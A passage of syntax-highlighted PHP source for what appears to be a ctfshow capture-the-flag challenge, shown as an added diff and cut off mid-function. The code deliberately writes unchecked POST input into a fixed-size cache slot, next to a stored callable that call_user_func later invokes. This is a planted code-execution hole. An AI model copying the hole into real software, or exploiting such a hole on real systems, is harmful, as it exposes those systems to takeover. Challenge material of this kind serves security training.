+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span><span class=lnt>191
+</span><span class=lnt>192
+</span><span class=lnt>193
+</span><span class=lnt>194
+</span><span class=lnt>195
+</span><span class=lnt>196
+</span><span class=lnt>197
+</span><span class=lnt>198
+</span><span class=lnt>199
+</span><span class=lnt>200
+</span><span class=lnt>201
+</span><span class=lnt>202
+</span><span class=lnt>203
+</span><span class=lnt>204
+</span><span class=lnt>205
+</span><span class=lnt>206
+</span><span class=lnt>207
+</span><span class=lnt>208
+</span><span class=lnt>209
+</span><span class=lnt>210
+</span><span class=lnt>211
+</span><span class=lnt>212
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>ctfshow</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>C</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=no>__REF_OFFSET_1</span> <span class=o>=</span> <span class=mh>0x41</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=no>__REF_OFFSET_2</span> <span class=o>=</span> <span class=mh>0x7b</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=no>__REF_OFFSET_3</span> <span class=o>=</span> <span class=mh>0x5b</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=no>__REF_OFFSET_4</span> <span class=o>=</span> <span class=mh>0x60</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=no>__REF_OFFSET_5</span> <span class=o>=</span> <span class=mh>0x30</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=no>__REF_OFFSET_6</span> <span class=o>=</span> <span class=mh>0x5f</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=no>__REF_SIZE__</span><span class=o>=</span> <span class=mi>20</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=no>__REF_VAL_SIZE__</span><span class=o>=</span> <span class=mi>50</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$cursor</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$cache</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$ref_table</span><span class=o>=</span><span class=p>[];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>main</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$flag</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>define</span><span class=p>(</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>,</span><span class=nx>self</span><span class=o>::</span><span class=na>__REF_VAL_SIZE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>define</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$flag</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>neaten</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>fill</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span><span class=nv>$flag</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>fill</span><span class=p>(</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>,</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>read</span><span class=p>(</span><span class=s1>&#39;ctfshow&#39;</span><span class=p>)</span><span class=o>===</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>read</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>fill</span><span class=p>(</span><span class=nv>$ref</span><span class=p>,</span><span class=nv>$val</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>rewind</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fseek</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ref_table</span><span class=p>[</span><span class=nv>$ref</span><span class=p>]</span><span class=o>+</span><span class=mi>23</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$arr</span> <span class=o>=</span> <span class=nx>str_split</span><span class=p>(</span><span class=nv>$val</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>foreach</span> <span class=p>(</span><span class=nv>$arr</span> <span class=k>as</span> <span class=nv>$s</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nx>pack</span><span class=p>(</span><span class=s2>&#34;C&#34;</span><span class=p>,</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$s</span><span class=p>)));</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=nx>sizeof</span><span class=p>(</span><span class=nv>$arr</span><span class=p>);</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>self</span><span class=o>::</span><span class=na>__REF_VAL_SIZE__</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
+</span></span><span class=line><span class=cl>            <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nx>pack</span><span class=p>(</span><span class=s2>&#34;C&#34;</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cursor</span><span class=o>=</span> <span class=nx>ftell</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>clear</span><span class=p>(</span><span class=nv>$var</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>neaten</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ref_table</span><span class=p>[</span><span class=s1>&#39;_clear_&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cursor</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$arr</span> <span class=o>=</span> <span class=nx>str_split</span><span class=p>(</span><span class=s2>&#34;_clear_&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>foreach</span> <span class=p>(</span><span class=nv>$arr</span> <span class=k>as</span> <span class=nv>$s</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$s</span><span class=p>),</span><span class=s2>&#34;C&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=nx>sizeof</span><span class=p>(</span><span class=nv>$arr</span><span class=p>);</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>self</span><span class=o>::</span><span class=na>__REF_SIZE__</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span><span class=s1>&#39;C&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$arr</span> <span class=o>=</span> <span class=nx>str_split</span><span class=p>(</span><span class=no>__NAMESPACE__</span><span class=o>.</span><span class=s2>&#34;\C::clear&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>foreach</span> <span class=p>(</span><span class=nv>$arr</span> <span class=k>as</span> <span class=nv>$s</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$s</span><span class=p>),</span><span class=s2>&#34;C&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=mh>0x36d</span><span class=p>,</span><span class=s1>&#39;Q&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span><span class=s1>&#39;C&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>self</span><span class=o>::</span><span class=na>__REF_SIZE__</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span><span class=s1>&#39;C&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>readNeaten</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>rewind</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fseek</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ref_table</span><span class=p>[</span><span class=s1>&#39;_clear_&#39;</span><span class=p>]</span><span class=o>+</span><span class=nx>self</span><span class=o>::</span><span class=na>__REF_SIZE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$f</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>truncation</span><span class=p>(</span><span class=nx>fread</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nx>self</span><span class=o>::</span><span class=na>__REF_SIZE__</span><span class=o>-</span><span class=mi>4</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$t</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>truncation</span><span class=p>(</span><span class=nx>fread</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nx>self</span><span class=o>::</span><span class=na>__REF_SIZE__</span><span class=o>-</span><span class=mi>12</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$p</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>truncation</span><span class=p>(</span><span class=nx>fread</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nx>self</span><span class=o>::</span><span class=na>__REF_SIZE__</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span><span class=nv>$p</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>define</span><span class=p>(</span><span class=nv>$ref</span><span class=p>,</span><span class=nv>$size</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checkRef</span><span class=p>(</span><span class=nv>$ref</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$r</span> <span class=o>=</span> <span class=nx>str_split</span><span class=p>(</span><span class=nv>$ref</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ref_table</span><span class=p>[</span><span class=nv>$ref</span><span class=p>]</span><span class=o>=</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cursor</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>foreach</span> <span class=p>(</span><span class=nv>$r</span> <span class=k>as</span> <span class=nv>$s</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$s</span><span class=p>),</span><span class=s2>&#34;C&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=nx>sizeof</span><span class=p>(</span><span class=nv>$r</span><span class=p>);</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>self</span><span class=o>::</span><span class=na>__REF_SIZE__</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span><span class=s1>&#39;C&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span><span class=nx>pack</span><span class=p>(</span><span class=s2>&#34;v&#34;</span><span class=p>,</span><span class=nv>$size</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span><span class=nx>pack</span><span class=p>(</span><span class=s2>&#34;C&#34;</span><span class=p>,</span><span class=mh>0x31</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cursor</span><span class=o>=</span> <span class=nx>ftell</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nv>$size</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>read</span><span class=p>(</span><span class=nv>$ref</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>array_key_exists</span><span class=p>(</span><span class=nv>$ref</span><span class=p>,</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ref_table</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=nx>\Exception</span><span class=p>(</span><span class=s2>&#34;Ref not exists!&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ref_table</span><span class=p>[</span><span class=nv>$ref</span><span class=p>]</span><span class=o>!=</span><span class=mi>0</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>seekCursor</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ref_table</span><span class=p>[</span><span class=nv>$ref</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nx>rewind</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=nv>$cref</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=mi>20</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$csize</span> <span class=o>=</span> <span class=nx>unpack</span><span class=p>(</span><span class=s2>&#34;v&#34;</span><span class=p>,</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=mi>2</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$usize</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$val</span> <span class=o>=</span> <span class=nx>fread</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nv>$csize</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>truncation</span><span class=p>(</span><span class=nv>$val</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>write</span><span class=p>(</span><span class=nv>$val</span><span class=p>,</span><span class=nv>$fmt</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>seek</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span><span class=nx>pack</span><span class=p>(</span><span class=nv>$fmt</span><span class=p>,</span><span class=nv>$val</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cursor</span><span class=o>=</span> <span class=nx>ftell</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>seek</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>rewind</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fseek</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cursor</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>truncation</span><span class=p>(</span><span class=nv>$data</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>implode</span><span class=p>(</span><span class=nx>array_filter</span><span class=p>(</span><span class=nx>str_split</span><span class=p>(</span><span class=nv>$data</span><span class=p>),</span><span class=k>function</span><span class=p>(</span><span class=nv>$var</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$var</span><span class=o>!==</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>seekCursor</span><span class=p>(</span><span class=nv>$cursor</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>rewind</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fseek</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>,</span> <span class=nv>$cursor</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>checkRef</span><span class=p>(</span><span class=nv>$ref</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$r</span> <span class=o>=</span> <span class=nx>str_split</span><span class=p>(</span><span class=nv>$ref</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>sizeof</span><span class=p>(</span><span class=nv>$r</span><span class=p>)</span><span class=o>&gt;</span><span class=nx>self</span><span class=o>::</span><span class=na>__REF_SIZE__</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=nx>\Exception</span><span class=p>(</span><span class=s2>&#34;Refenerce size too long!&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$r</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=o>||</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checkByte</span><span class=p>(</span><span class=nv>$r</span><span class=p>[</span><span class=mi>0</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=nx>\Exception</span><span class=p>(</span><span class=s2>&#34;Ref invalid!&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>array_shift</span><span class=p>(</span><span class=nv>$r</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>foreach</span> <span class=p>(</span><span class=nv>$r</span> <span class=k>as</span> <span class=nv>$s</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>checkByte</span><span class=p>(</span><span class=nv>$s</span><span class=p>)){</span>
